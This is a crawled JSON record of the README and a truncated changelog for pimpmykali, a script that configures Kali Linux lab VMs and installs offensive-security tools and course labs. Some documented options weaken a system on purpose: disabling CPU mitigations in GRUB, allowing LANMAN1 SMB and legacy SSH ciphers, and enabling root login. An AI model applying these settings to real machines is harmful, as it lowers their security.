{
  "metadata": {
    "timestamp": 1736568395732,
    "page": 339,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjM0MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "Dewalt-arch/pimpmykali",
      "stars": 2119,
      "defaultBranch": "master",
      "files": [
        {
          "name": "README.md",
          "type": "blob",
          "size": 18.4599609375,
          "content": "# pimpmykali.sh\n\n![pmk2 0 0](https://github.com/user-attachments/assets/08cdd9c8-83c7-41e0-a65c-8bf7690a7f36)\n\n\n# Fixes for new imported Kali Linux virtual machines\n  - Author assumes zero liability for any data loss or misuse of pimpmykali\n  - Baremetal installations are unsupported\n  - WSL/WSL2 installations are unsupported\n  - Menu breakdown added below revision history\n\n# Github index updated added +x permission:\n  - Script is now be executable upon clone (perms: 755 rwxr-xr-x added to github)\n  - There is no need to chmod +x pimpmykali.sh upon git clone\n\n# Installation:\n```console\n# Remove existing pimpmykali folder\nrm -rf pimpmykali/\n\n# Clone pimpmykali repository & enter the folder\ngit clone https://github.com/Dewalt-arch/pimpmykali\n\ncd pimpmykali\n\n# Execute the script - For a new Kali VM, run menu option 'N'\n# (The script must be run with root privileges)\nsudo ./pimpmykali.sh\n\n# Use --auto command line arg to bypass the menu and prompts\n\n# Use --help for full list of available command line args\n```\n\n# Special Thanks to Pimpmykali-Mirrors Testers!!\n  - Crazy_Man - https://github.com/The-Crazy-Man\n  - Andro\n\n# Code Contributors\n  - Yaseen - https://github.com/AhamedYaseen03\n  - Crazy_Man - https://github.com/The-Crazy-Man\n  - blindpentester https://github.com/blindpentester\n  - pswalia2u https://github.com/pswalia2u\n  - Alek https://github.com/wodensec\n  - Gr1mmie https://github.com/Gr1mmie\n  - Aksheet https://github.com/Aksheet10\n  - 0xC0FFEE VirtualBox Home Lab Build (updated link!)\n    https://benheater.com/building-a-security-lab-in-virtualbox/\n  - TheMadHuman https://github.com/TMH-Sec\n  - Aashiksamuel https://github.com/aashiksamuel  (sublime install fix)\n  - m4ul3r \n  - lbalmaceda https://github.com/lbalmaceda\n\n# Writeups / Honorable Mentions\n  - ip3c4c_n00b https://ip3c4c.com/2202_homelab_vmware/\n\n# Revision 2.0.0 - Release\n- New additions and feature requests\n  - Menu option verification before execution \n    - on screen notification of which menu option is selected\n    - y or Y to continue\n    - n or N returns to main menu\n  - speedrun variable to bypass menu and prompts \n  - --auto command line switch, uses speedrun var\n    - set speedrun var to 1\n    - bypasses menu and prompts\n  - --autonoroot command line switch, uses speedrun var\n    - set speedrun var to 1 \n    - bypasses menu, prompts, and enable root login\n  - exit status checks on most all functions\n    - check done via case statement\n  - updated package installed lookup uses apt-cache\n    - speed improvement\n  - updated --help menu with new command line switches\n    - --bloodhound, --netexec, --cme, and many others \n    - use --help to view list and descriptions\n  - waybackrust\n    - installs to /usr/bin/waybackrust\n    - included in fix_missing\n    - command line switch --wayback\n  - plumhound\n    - installs to /opt/PlumHound\n    - symlinks created /usr/local/bin/PlumHound.py and /usr/local/bin/plumhound\n    - included in fix_missing\n    - command line switch --plumhound\n  - default to python3 and pip for python3\n      - python2.7 symlinked to /bin/python2\n      - pip2 installed to /usr/bin/pip2\n  - setup_binfmt_mount\n    - checks for kernel module binfmt_misc, loads module if not loaded\n    - checks /etc/fstab for binfmt_misc entry, appends to fstab if not found\n    - checks for binfmt_misc mount point, mounts if not mounted\n    - command line switch --binfmt\n  - setup_binfmt_winexe\n    - checks /proc/sys/fs/binfmt_misc for DOSWin\n    - creates /proc/sys/fs/binfmt_misc/DOSWin if not found\n    - installs wine\n    - command line switch --binfmt-winexe\n\n- Added functions\n    - update_linux_headers\n      - check for linux-headers installed after only_upgrade function\n      - ensures if new kernel is installed during only_upgrade linux-headers are installed\n    - is_installed, is_installed_remove, is_installed_reinstall\n      - reduce redundant code, exit status checks\n    - install_pip2\n      - install pip2 if not already installed\n      - /usr/bin/pip2\n    - install_pip3\n      - install pip3 if not already installed\n      - /usr/bin/pip\n    - install_pipx\n      - install pipx\n      - pipx ensurepath\n    - install_pip2_modules\n      - install required pip2 modules for older tooling\n    - install_pip3_modules\n      - check for required modules, install if not installed\n    - check_dmidecode function\n      - used in check_vm function\n\n- Updated functions\n  - make_rootgreatagain updated with speedrun var\n    - if --auto is used, bypass menu\n    - only prompt to set root password\n    - moved make_rootgreatagain to the earliest part of the script\n  - fix_sead_warning, fix_impacket_array, install_old_impacket\n    - install impacket 0.9.19 side by side with impacket latest\n    - python3 and pip for python3 as default\n    - pip2 for python2\n    - command line switch --nukeimpacket \n      - uses speedrun var\n      - bypasses prompts\n  - fix_cme\n    - installs from kali repo\n  - fix_netexec, fix_nxc_symlinks\n    - installs from github\n  - fix_seclists \n    - installs from kali repo\n  - fix_smb\n    - checks for client min protocol = lanman1\n  - fix_golang is now install_golang \n  - check_vm\n    - ensure linux-headers are installed\n    - calls update_linux_headers after apt upgrade\n  - fix_virtualbox\n    - install additions for detected virtualbox version on hostos\n  - fix_gowitness \n    - always get latest release from github\n    - installs additional dependencies\n  - fix_pyftpdlib \n    - updated for python3\n\n- Replaced functions\n    - python_pip_curl replaced with install_pip2\n    - fix_pipxlrd, fix_python_requests replaced with install_pip2_modules\n\n- Removed functions\n    - check_chrome, function was integrated with fix_chrome\n\n- Updated Menu items\n  - Menu option N, removed apt upgrade from function\n    - only menu option 9 or --upgrade will run an apt upgrade\n  - updated menu option 5 - Install Impacket\n    - function will install Impacket latest from kali repo\n  - Reduced overall number of menu items by using command line --args\n\n- Updated TCM Security course setup installations\n  - Practical Bug Bounty \n  - C# 101 for Hackers\n  - Hacking IoT\n  - PEH WebLabs\n  - Hacking API\n\n- Removed deprecated courses\n\n- change history before 2.0.0 moved to changelog.txt\n\n\n# Menu Breakdown of Pimpmykali\n\n- All menu options will require confirmation after selection\n  - Y or y to continue\n  - N or n to return to menu\n\n- Menu option N  (New Users/New VM's Should start here!)\n  - executes menu option 0 fix all ( options 1 thru 8 )\n  - command line switch: --newvm\n\n- Menu option = Pimpmykali-Mirrors (rev 1.3.2)\n  - obtain kali mirror list and process\n  - round-trip-time ping test to all mirrors, select top 10 with shortest rtt\n  - small download >1MB from the top 10 mirrors, select top 5 fastest transfers\n  - large download 10MB test the final 5 mirrors, select fastest transfer\n  - generate new /etc/apt/sources.list with the new selected mirror\n  - prompt Y or N to write new changes to /etc/apt/sources.list\n    - Y writes changes /etc/apt/sources.list\n      - create backup of original sources.list in /etc/apt/sources.list_date_time\n      - write new deb and deb-src lines with new mirror to /etc/apt/sources.list\n    - N exits and makes no change to /etc/apt/sources.list\n  - command line switch: --mirrors\n\n- Menu Option ! - Nuke Impacket\n  - installs impacket 0.9.19 side by side with impacket latest\n  - pip3 as default\n    - /usr/bin/pip\n  - python3 as default\n    - /bin/python\n  - python2\n    - /bin/python2\n  - pip2 installed via curl\n    - /usr/bin/pip2\n  - pip2 modules installed for impacket 0.9.19\n  - command line switch: --nukeimpacket\n\n- Menu Option @ - Install Nessus (amd64 or arm64)\n  - downloads and installs the current version of Nessus \n  - starts nessusd service \n  - command line switch: --nessus\n\n- Menu Option $ - Uninstall Nessus (amd64 or arm64) \n  - stops all nessusd service\n  - uninstalls nessus \n  - command line switch: --nukenessus\n\n- Menu Option 1 - Fix missing\n  - fix_sources\n    - uncomment #deb-src from /etc/apt/sources.list\n  - setup binfmt_misc mount in /etc/fstab\n    - mount binfmt_misc /proc/sys/fs/binfmt_misc\n  - fix .hushlogin\n  - install libwacom-common if not installed\n  - check if linux-headers is installed\n  - check if dkms is installed\n  - set ssh for wide compatibility\n  - disables power management\n    - xfce\n    - gnome\n  - blacklists pcspkr kernel module \n    - /etc/modprobe.d/nobeep.conf\n  - installs if not installed\n    - amass\n    - assetfinder\n    - bloodhound\n    - chisel\n    - crackmapexec\n    - docker-compose from github\n    - enumforlinxu\n    - enumforlinux-ng\n    - flameshot installed\n    - ffuf\n    - gedit installed\n      - gedit display fix applied\n    - ghidra\n      - adds ghidra dark theme\n    - gobuster\n    - gowitness latest from github\n    - golang\n      - adds golang GOPATH to .bashrc and .zshrc\n    - google-chrome\n    - htop\n    - httprobe\n    - linpeas/winpeas from github\n      - /opt/winpeas\n      - /opt/linpeas\n    - locate\n    - mitm6\n    - nextexec from Pennnyw0rth github\n      - creates symlinks in /usr/local/bin\n    - neo4j\n    - plumhound\n    - proxychains\n    - pyftpdlib for python3\n    - python3-pip installed and set as the default pip\n      - /usr/bin/pip\n    - python2 pip via curl\n      - /usr/bin/pip2\n    - python3 is the default \n      - /bin/python\n    - python2\n      -  /bin/python2\n    - installs python2 modules for older tooling\n      - setuptools\n      - importlib\n      - flask\n      - ldap3==2.5.1\n      - pycryptodome\n      - xlrd==1.2.0\n      - scapy==2.4.0\n      - colorama\n      - termcolor\n      - service-identity\n      - requests==2.2.1\n    - rockyou\n      - gunzip /usr/share/wordlists/rockyou.gz\n    - seclists\n    - set (social engineering toolkit)\n    - spike\n    - sqlmap\n    - sshuttle\n    - vscode\n      - common vscode extensions\n    - waybackrust\n    - wfuzz\n  - command line switch: --missing\n\n- Menu Option 2 - Fix smb.conf\n  - checks for in /etc/samba/smb.conf\n    - client min protocol = LANMAN1\n  - command line switch: --smbconf\n\n- Menu Option 3 - Install Golang \n  - Installs golang\n    - checks for GOPATH in .bashrc and .zshrc\n    - if GOPATH is found, adds nothing\n    - if not found, adds GOPATH statements to both .zshrc and .bashrc\n  - command line switch: --golang\n\n- Menu Option 4 - Fix Grub\n  - adds mitigations=off to GRUB_CMDLINE_LINUX_DEFAULT\n  - command line switch: --grub\n\n- Menu Option 5\n  - Installs latest impacket from kali repo\n  - command line switch: --impacket\n\n- Menu Option 6 - Enable root login\n  - installs kali-root-login\n    - prompts for root password\n    - copy /home/kali/* to /root prompt (1.1.2)\n    - prompt are you sure? to copy /home/kali to /root prompt (1.1.3)\n  - command line switch: --root\n\n- Menu Option 7\n  - fix_dockercompose\n    - installs docker.io from kali repo\n    - check if docker compose is installed or not\n    - if not installed, install latest from github\n    - if installed, check local version vs github version\n      - install newer version if found\n    - Menu option 7 is included in Menu options 0, N or 1\n  - command line switch: --dockercompose\n\n- Menu Option 8 - Fix Nmap\n  - wget nmap script fixes\n    - clamav-exec.nse\n    - http-shellshock.nse\n    - included in fix_missing\n  - command line switch: --nmap\n\n- Menu Option 9 - Pimpmyupgrade\n  - ensure linunx-headers are installed before and after apt upgrade\n  - Hypervisor detection (vmware, virtualbox, qemu/libvirt)\n    - installs additions for detected version of virtualbox on hostos\n  - virtualbox shared folder fix applied\n  - command line switch --upgrade\n\n- Menu Option 0 - Fix all (1-8)\n  - Executes ONLY Menu options 1 thru 8\n  - command line switches:\n    - --auto \n      - bypasses menu\n      - enables root login\n      - only prompt is to set the root account password\n    - --autonoroot\n      - bypasses menu\n      - bypasses prompts\n      - bypasses enable root login\n    - --all\n      - bypasses menu\n      - bypasses enable root login\n      - has all prompts\n\n- Menu Option A\n  - Setup for Mobile Application Penetration Tester course\n  - command line switch: --mapt\n\n- Menu Option B\n  - Installs labs for TCM Practical Bugbounty course \n  - command line switch: --pbb\n\n- Menu Option C\n  - removed, see --chrome command line switch\n  - is included in Menu options 0, N or 1\n\n- Menu Option D - Fix Gedit Connection Refused\n  - removed see --gedit command line switch\n    - install gedit\n    - Apply gedit unable to open display as root fix\n  - is included in Menu options 0, N or 1\n\n- Menu Option E \n  - Install TCM PEH Course WebApp Labs, docker\n  - command line switch: --pehweblab\n\n- Menu Option F\n  - removed see --brokenxfce command line switch\n    - Fixes XFCE Broken Icons \"TerminalEmulator\" Not Found\n    - Fixes XFCE Open Catfish instead of Thunar\n\n- Menu Option G\n  - removed see --ghidra command line switch\n  - is included in Menu options 0, N or 1\n\n- Menu option H - Fix httprobe\n  - removed see --httprobe command line switch\n  - is included in Menu options 0, N or 1\n\n- Menu Option I\n  - removed see --mitm6 command line switch\n  - is included in Menu options 0, N or 1\n\n- Menu Option J\n  - none\n\n- Menu Option K\n  - Reconfigure Keyboard, Language and Layout + Variant\n\n- Menu Option L\n  - removed see --sublime command line switch\n\n- Menu Option M\n  - none\n\n- Menu Option N\n  - listed above at the top\n\n- Menu Option O - Practical API Hacking Course\n  - Practical API Hacking course setup \n  - amd64 and arm64 aware\n  - root user and normal user aware\n  - installs docker.io docker-compose\n    - docker service is enabled \n  - installs postman to /opt/Postman/Postman \n    - symlink is created for /opt/Postman/Postman at /usr/bin/postman\n  - cleanup.sh script created \n  - installs crAPI to $HOME/labs\n  - command line switch: --api\n\n- Menu Option P\n  - Download all the peas from github\n    - linpeas to /opt/linpeas\n    - winpeas to /opt/winpeas\n\n- Menu Option Q\n\n- Disable Power Management function moved to Menu options 0, N or 1\n  - Detect desktop environment\n    - XFCE\n    - Gnome\n  - Disable power management\n  - is included in Menu options 0, N or 1\n\n- Menu Option S - Fix Spike\n  - removed see --spike command line switch\n    - Fixes undefined symbol error thrown when using generic_send_tcp\n  - is included in Menu options 0, N or 1\n\n- Menu Option T\n  - Reconfigure Timezone\n\n- Menu Option U\n  - Install Netexec (nxc)\n  - command line switch: --netexec\n\n- Menu Option V\n  - Install MS VSCode\n  - command line switch: --vscode\n\n- Menu Option X\n  - exit pimpmykali.sh menu\n\n- Menu Option Y\n  - Andrew B's IoT and Hardware Hacking Course Setup \n    - install dependencies sigrok xxd zlib1g-dev liblzma-dev liblzo2-dev\n    - clone sasquatch to /opt/sasquatch\n    - patches sasquatch with M1-Kali.patch.txt\n    - builds patched sasquatch\n    - installs to /usr/local/bin/sasquatch\n    - calls fix_ghidra function to install ghidra from github\n    - installs ghidra dark theme to /opt/ghidra-dark-theme\n  - command line switch: --iot\n\n- Menu Option Z\n  - Install course requirements for Alex T's C# 101 for Hackers\n    - installs vscode\n    - installs vscode course extensions\n    - installs dotnet, aspnetcore, dotnet-runtime\n    - adds DOTNET_ROOT path statments to $HOME/.nameofshellrc \n  - command line switch: --csharp\n\n# Command line switches and descriptions\n  - To view all command line args\n    - sudo ./pimpmykali.sh --help\n    - --auto  \n      - set speedrun var\n      - bypass menu\n      - only prompt is to set password for the root account\n    - --autonoroot  \n      - set speedrun var \n      - bypass menu\n      - bypass enable root login\n      - bypass prompts\n    - --all\n      - run menu option 0 (fix all) \n      - all prompts\n      - bypass enable root login\n    - --binfmt\n      - enable and mount /proc/sys/fs/binfmt_misc\n    - --binfmt-winexe\n      - enable dos/windows exe in binfmt_misc, installs wine\n    - --bloodhound  \n      - install bloodhound\n    - --brokenxfce  \n      - apply broken xfce fix\n    - --cme  \n      - install crackmapexec\n    - --checkvm  \n      - detect hypervisor\n        - vmware\n        - virtualbox\n        - qemu/utm\n      - install guest additions for detected hypervisor\n    - --dockercompose  \n      - install docker compose\n    - --flameshot\n      - install flameshot\n    - --gedit\n      - install gedit\n      - apply fix connection refused fix\n    - --golang\n      - install golang\n    - --gowitness\n      - install gowitness latest from github\n    - --ghidra\n      - install ghidra from github, add dark theme\n    - --grub\n      - update grub\n    - --help  \n      - this help menu\n    - --httprobe  run fix_httprobe\n    - --impacket  install impacket latest\n    - --nukeimpacket  \n      - install impacket 0.9.19\n      - python3 as default\n        - /bin/python\n      - pip3 as default \n        - /usr/bin/pip\n      - install pip2 via curl\n        - /usr/bin/pip2\n    - --mirrors  \n      - run pimpmykali-mirrors speedtest\n    - --mitm6  \n      - reinstall mitm6\n    - --missing\n      - run menu option 1 (fix missing)\n    - --neo4j\n      - install neo4j\n    - --newvm  \n      - menu option N new vm setup\n    - --nmap  \n      - run fix nmap\n    - --netexec\n      - install netexec from github\n    - --nessus\n      - download nessus latest\n      - install nessus \n      - start nessusd service\n    - --nukenessus\n      - stop nessusd service \n      - remove nessus\n    - --peas\n      - get all the peas from github (linpeas/winpeas)\n      - linpeas to /opt/linpeas\n      - winpeas to /opt/winpeas\n    - --plumhound  \n      - install plumhound\n      - adds symlinks in /usr/local/bin to put plumhound in $PATH\n    - --root\n      - set speedrun var\n      - enable root login\n      - only prompt is to set root account password\n    - --smbconf\n      - run fix smb.conf \n    - --seclists\n      - install seclists\n    - --spike  \n      - run fix_spike function\n    - --sublime\n      - install sublime\n    - --vscode  \n      - install ms-vscode\n    - --wayback  install waybackrust\n    - --upgrade\n      - system upgrade\n      - checks for linux-headers installed after upgrade\n      - hypervisor detection\n        - vmware\n        - virtualbox\n        - qemu/utm\n      - install guest additions for detected hypervisor\n    - Python fixes:\n      - --pip2  \n        - install pip2 via curl\n        - /usr/bin/pip2\n      - --pip3 \n        - install pip3\n        - /usr/bin/pip\n      - --fixpip \n          - run fix pip function\n          - ensure /usr/bin/pip is for python3\n      - --pipx\n        - install pipx\n        - pipx ensurepath\n    - TCM Security course setups\n      - --api  Hacking API course setup\n      - --csharp  C# course setup\n      - --iot  IoT Hacking course setup\n      - --mapt  Mobile Application Pentester course setup\n      - --pbb  Practical Bugbounty course setup\n      - --pehweblab  PEH course Web Lab setup\n\n# TODO\n  - clean up todo list :)\n"
        },
        {
          "name": "changelog.txt",
          "type": "blob",
          "size": 39.630859375,
          "content": "# Revision 1.8.1b - Updated Ghidra Download function\n  - corrected download\n\n# Revision 1.8.1a - Added Andrew B's IoT and Hardware Hacking Course Setup \n  - Menu option Y or y\n    - stand alone function\n    - installs dependencies sigrok xxd zlib1g-dev liblzma-dev liblzo2-dev\n    - clone sasquatch to /opt/sasquatch\n    - patches sasquatch with M1-Kali.patch.txt\n    - builds patched sasquatch\n    - installs to /usr/local/bin/sasquatch\n    - calls fix_ghidra function to install ghidra from github\n    - installs ghidra dark theme to /opt/ghidra-dark-theme\n  - updated fix_ghidra function to always pull latest release\n\n# Revision 1.8.1 - Ghidra\n  - Menu option G - Install Ghidra\n    - Included in menu options 0, N and 1\n    - removes ghidra installed from apt repository\n    - downloads and installs ghidra from github\n    - ghidra dark-theme added to /opt/ghidra-dark-theme\n\n# Revision 1.8.0 - Added Alex T's C# 101 for Hackers Course Setup\n  - Menu Option Z\n    - installs vscode\n    - installs vscode course extensions\n      - C# Dev Kit (microsoft)\n      - C# Extensions (JosKreativ)\n      - VSCode Solutions Explorer (Fernando Escolar)\n      - Jupyter (microsoft)\n      - Polyglot Notebooks (microsoft)\n      - Material Icon Theme (Philipp Kief) \n    - installs dotnet, aspnetcore, dotnet-runtime\n    - adds DOTNET_ROOT and PATH= statements to $HOME/.nameofshellrc\n    - status screen at end of install with version information\n\n# Revision 1.7.9a6 - docker-compose / docker.io\n  - Enabled menu option 7 for Fix DockerCompose\n  - fix_dockercompose is included in options 0 (fix_all), N (new setup) or 1 (fix_missing)\n  - New function added fix_dockercompose lines 253 to 330\n    - check if docker-compose is installed if not install latest from github\n    - if docker-compose is installed will version check system vs github and install newer version\n      - case statement exit code handling\n  - Consolidated docker-compose and docker.io installations in updated functions \n    - hacking_api_prereq\n    - map_prereq\n    - pbb_lab_setup\n    - peh_weblab_setup\n      - now uses fix_dockercompose function to install docker-compose and docker.io\n  - revision notes 1.7.9 to 1.7.9a3 moved to changelog.txt\n  - Readme.md updated for Menu option 7\n\n# Revision 1.7.9a5 - curl --w \n  - Thanks Alek, updated curl from --w to -w \n    - functions small_speedtest, large_speedetest\n\n# Revision 1.7.9a4 - updated fix_linwinpeas function\n  - Thanks lbalmaceda! for the updated url and code submission\n  - corrected url for Lin/WinPeas\n  - updated function to always pull latest release  \n\n# Revision 1.7.9a3 - updated functions\n  - updated fix_sources function\n    - includes non-free and non-free-firmware\n  - updated gen_new_sources in Pimpmykali-Mirrors menu option =\n    - includes non-free and non-free-firmware\n\n# Revision 1.7.9a2 - updated exit_screen function\n  - function modified to re-source logged in user ~/nameofshellrc \n\n# Revision 1.7.9a1 - netexec\n  - updated installation to use pipx \n  - created new function to ensure symlinks are created\n  - created new function for user and root installations\n  - menu option U or u to install netexec \n  - is also included in menu option N, 0 or 1 \n\n# Revision 1.7.9a - netexec (nxc)\n  - menu option U or u to install netexec \n  - is also included in menu options N, 0 or 1\n\n# Revision 1.7.9 - crackmapexec\n  - corrected pathing of symlinks created in $HOME/.local/bin\n\n# Revision 1.7.8 - Pimpmykali-Mirrors\n  - correction/update to current url for mirrorlist\n\n# Revision 1.7.7 - Practical Bugbounty course added\n  - installs course labs to ~/pbb/bugbounty\n  - creates ~/pbb/bugbounty/start-pbb-labs.sh startup script \n  - script resets the database on each startup\n  - creates ~/pbb/bugbounty/cleanup-pbb-labs.sh this will all docker containers\n\n# Revision 1.7.6a - updated cme installer \n  - correct to git clone of the repo \n  \n# Revision 1.7.6 - menu option % has been restored \n  - git clone url updated\n  - revisions 1.7.3x and older moved to changelog.txt \n\n# Revision 1.7.5 - removed menu option % \n  - mpgn's github page is now 404 status, installer will need rework  \n\n# Revision 1.7.4h - updated pipx installer for fix_cme \n  - updated function to install pipx from apt \n\n# Revision 1.7.4g - updated path statement for fix_cme\n  - corrected path statement for fix_cme user function\n\n# Revision 1.7.4f - ssh wide compatibility function \n  - added function fix_sshwidecompat\n  - will be ran in menu options N, 0 or 1 \n\n# Revision 1.7.4e - updated fix_cme function with fix_cme_symlinks\n  - added additional function to create symlinks in ~/.local/bin for cme 6.x.x\n\n# Revision 1.7.4d - updated PEH Course WebApp Labs\n  - added fix for permission denied issues in the lab\n\n# Revision 1.7.4c - added cme and cmedb for crackmapexec 6.x installation\n  - downloads and installs cme and cmedb using pipx\n  - installations for both user and root \n\n# Revision 1.7.4b - updated nessus download function\n  - function should now automatically grep the version number of Nessus and download\n  - moved amd64 and arm64 variables into their respective functions\n\n# Revision 1.7.4a - added chisel \n  - chisel added to menu options 0, N or 1 \n\n# Revision 1.7.4 - Winpeas update\n  - script will now pull winpeas from the 20230419-b6aac9cb release, April 2023\n  - workaround for current issue of winpeas not being self contained\n\n# Revision 1.7.3a - update to start-peh-labs.sh\n  - included function in script to reset databases on startup\n\n# Revision 1.7.3 - PEH Web Lab update \n  - Major Milestone! 2000+ Lines of code! \n  - added installation for Practical Ethical Hacker WebApp Labs\n  - menu option E \n  - added ~/peh/labs/start-peh-labs.sh startup script \n  - added ~/peh/labs/cleanup-peh-labs.sh cleanup script \n  - all revision 1.6.x announcements moved to changelog.txt \n\n# Revision 1.7.2 - Hacking API Lab update \n  - added creation of start-api-hacking.sh \n  - this is to help mitigate issues with unhealthy containers\n\n# Revision 1.7.1d - Tracelabs Osint VM\n  - added detection of the tracelabs osint vm and prevent the script from \n    running if specific conditions are met, this is due to python incompatibility\n    with some tooling in the tracelabs osint vm.   \n\n# Revision 1.7.1c - added proxychains and sshuttle\n  - proxychains and sshuttle will be installed via menu options 0, N, or 1   \n\n# Revision 1.7.1b - updated lin/winpeas function \n  - releases are now being dynamically checked for most current\n  - url in script should now never need updating \n\n# Revision 1.7.1a - updates\n  - google-chrome-stable changed to pull .deb from google\n  - added installation for Neo4j\n  - added installation for Bloodhound  \n\n# Revision 1.7.1 - added download function for all the peas\n  - current linpeas release downloaded to /opt/linpeas\n  - current winpeas release downloaded to /opt/winpeas\n  - standalone menu function P or p \n  - included in menu functions N, 0 and 1 \n\n# Revision 1.7.0 - MobSF\n  - MAPT Course setup, Menu option A \n   - mobsf installation has been changed to a docker installation\n   - /usr/bin/mobsf-docker script created and made executable \n\n# Revision 1.6.9a - changed google-chrome installation source\n  - is now installed from the kali repo google-chrome-stable \n\n# Revision 1.6.9 - fix_impacket restored\n  - menu options N, 0 and 1 are fully operational   \n\n# Revision 1.6.8 - fix_impacket function temporarily commented out\n  - affecting menu options N, 0 and 1 \n  - issues with kali2023.2 \n\n# Revision 1.6.7 - Added installer and Uninstaller for Nessus\n  - menu option @ to install nessus\n  - menu option $ to nuke nessus \n\n# Revision 1.6.6 - Hacking API Course setup \n  - added Practical API Hacking Course setup (amd64 and arm64), menu option O\n  - Instructor Alex Olsen https://academy.tcm-sec.com/p/hacking-apis\n  - menu options rearranged in stand alone functions\n\n# Revision 1.6.5 - impacket\n  - added --user to impacket 0.9.19 install\n\n# Revision 1.6.4 - minor code cleanup \n\n# Revision 1.6.3 - mitm6 installation\n  - mitm6 moved from a python2 to python3 installation\n  - added --breaks-system-packages to get around pip related issues \n  - liblibc symlink correction added at the end of this function\n  \n# Revision 1.6.2 - FixSSH Removed\n  - use kali-tweaks 2023.1.3 to resolve the issue with ssh -i and hydra out of memory\n\n# Revision 1.6.1 - $pyver variable\n  - removed single quotes\n\n# Revision 1.6.0 - Atom removed + misc fixes/updates\n  - Corrected the non-interactive shell being opened for:\n    - Menu option K - Reconfigure Keyboard \n    - Menu option T - Reconfigure Timezone\n    - shell is now interactive and functions properly\n\n  - Added $archtype variable for potential upcoming arm64 specific support ( Mac m1, rasberry pi, etc )\n  - Added $pyver variable for detection of version of python3\n    - corrects error with installing python'$pyver'-venv and other various python required installations\n\n  - Atom \n    - has been deprecated/sunset and the installation of atom has been removed\n    - menu option 7 - Install atom removed \n\n  - Seclists\n    - changed seclists to be pulled from github, to be more verbose about what is taking place on screen\n\n  - gowitness function updated to detect amd64 or arm64 installations, still installs from github\n\n  - httprobe, assetfinder, amass are now installed from the kali repo instead of github\n\n  - Misc Fixes \n    - corrected if statement on line 1240 MPP Course Setup\n    - added function for apt_fixbroken and apt_fixbroken_complete\n    - removed functions: fix_bloodhound, ask_python39, fix_python39, fix_resopnder \n    - addded -o Dpkg::Progress-Fancy=\"1\" to all apt operations for fancy progress bars\n    - moved virt-what to be installed much earlier in the script \n    - general code cleanup\n\n  - Menu option B restored to BlindPenTesters - TheEssentials\n  - older revision history moved to changelog.txt\n\n# Revision 1.5.9 - gowitness update \n  - due to a new line error, pimpmykali is now hardcoded to pull gowitness 2.4.1\n    until the new line error in gowitness 2.4.2 is resolved. \n\n# Revision 1.5.8 - fixed-http-shellshock.nse \n  - updated script to obtain file from pimpmykali github\n\n# Revision 1.5.7 - Fix SSH Function \n  - Menu option letter O Only (is not included in N, 0 or 1 at this time)\n  - added function to set ssh to wide compatibility mode\n  - file created : /etc/ssh/ssh_config.d/kali-wide-compat.conf\n  - resolves issues with ssh -i id_rsa and various other legacy ciphers\n\n# Revision 1.5.6b - restart-vm-tools\n  - restart-vm-tools removed from check_vm function\n\n# Revision 1.5.6a - fix_assetfinder function\n  - Thank you m4ul3r for finding this!\n  - Not all wget statements were being eval'd\n    - all wgets are now eval'd\n\n# Revision 1.5.5 - Fix Responder Re-Enabled\n  - Downgrade Responder (R) Function updated\n    - ask_python39 function added: prompt before proceeding\n    - fix_python39 function\n      - if python3.10 is found :\n      - installs python3.9-full and python3.9-dbg\n      - resymlinks /bin/python3.9 to /bin/python3\n      - if python3.10 not found proceeds with responder downgrade\n\n  - New Menu item P - Fix Python3.9 (no prompt)\n    - will install python3.9-full and python3.9-dbg\n    - no prompt will be asked in this function\n\n# Revision 1.5.4 - Qemu update\n  - removed xserver-xorg-video-qxl is no longer in the kali repo\n  - updated function to install qemu-guest-agent\n  - revision history 1.5.0 -> 1.5.3 moved to changelog.txt\n   - thank you m4ul3r!\n\n# Revision 1.5.3 - Sublime Installation updated\n  - fix provided by aashiksamuel, thank you!\n  - function sublime_install lines 768->780 updated \n\n# Revision 1.5.2 - Python Requests\n  - specified specific version of requests to use 2.2.1\n\n# Revision 1.5.1 - Downgrade Metasploit - Disabled\n  - ruby has been upgraded to a default of 3.0\n    - msf5 requires ruby 2.8 or lower\n  - Downgrade msf5 function has been disabled\n    - Menu option D - Downgrade to msf5 Disabled\n    - Menu option M - MPP Course, removed downgrade to msf5 function\n\n# Revision 1.5.0 - fix_bloodhound function update\n  - removed hold on bloodhound at the start of the function to remove\n    an additional complication that was being created\n\n# Revision 1.4.9 - added assetfinder, added neo4j\n  - added assetfinder precompiled binary to the following\n    - Menu option 0\n    - Menu Option 1\n    - Menu Option N\n  - neo4j added in functions\n    - Menu Option B - Downgrade Bloodhound\n    - Menu Option 1 - Fix Missing\n    - Menu Option 0 - Fix All (runs 1-8)\n    - Menu Option N - New VM Setup (runs 1-9 + a few other functions)\n\n# Revision 1.4.8 - minor change to Menu option 9\n  - added fix_libwacom function to be called before fix_upgrade\n\n# Revision 1.4.7 - Downgrade Responder to 3.0.6.0\n  - Menu option R - Downgrades responder to v3.0.6.0\n    - is only called from menu option r or R\n    - uninstalls current responder, downloads and installs v3.0.6.0\n  - PPA Course requirements removed\n\n# Revision 1.4.6 - Bloodhound v4.1.0 incompatible collectors\n  - Menu Option B - Downgrade Bloodhound from 4.1.0 to 4.0.3\n    - is only called from Menu option B\n    - removes bloodhound, purges bloodhound\n    - downloads and installs bloodhound 4.0.3\n    - marks bloodhound package to prevent future upgrading\n  - revision history for 1.4.1 -> 1.4.4 moved to changelog.txt\n\n# Revision 1.4.5 - libwacom-common breaks apt\n  - Kali 2022.1 libwacom9 requires libwacom-common\n    - added to fix_missing function so it will be automatically installed\n    - menu options 0, 1 or N will apply this fix\n    - Credit: TheMadHuman  for bringing it to my attention\n\n\n# Revision 1.4.4 - Impacket 0.9.19 url updated\n  - URL Updated for changes on the SecureAuth github location for Impacket 0.9.19\n    (Thank you !Sora)\n\n# Revision 1.4.3 - MAPT Course pre-requirements + mobSF\n  - install all pre-reqs in kali for the MAPT Course\n  - git clone and install MobSF to /opt\n\n# Revision 1.4.2 - fix_go_path function update\n  - update to findrealuser variable :\n    - check for display 0 (:0) if found get user from display 0 tty login\n    - if display 0 (:0) is not found, get user from tty login\n  - revision history 1.4.0 moved to changelog.txt\n\n# Revision 1.4.1 - PPA Course Prerequisites\n  - Menu Option P has changed option now installs pre-req the PPA Course\n    - installs whois and bind9-dnsutils\n    - git clones spoofpoint to /opt/spoofpoint\n    - creates symlink for /opt/spoofpoint/spoofpoint in /usr/bin/spoofpoint\n      - spoofpoint now available globally via path\n  - Disable power management function moved to fix_missing function\n    - will be applied in options 0 1 or N\n  - revision history 1.3.9 moved to changelog.txt\n\n# 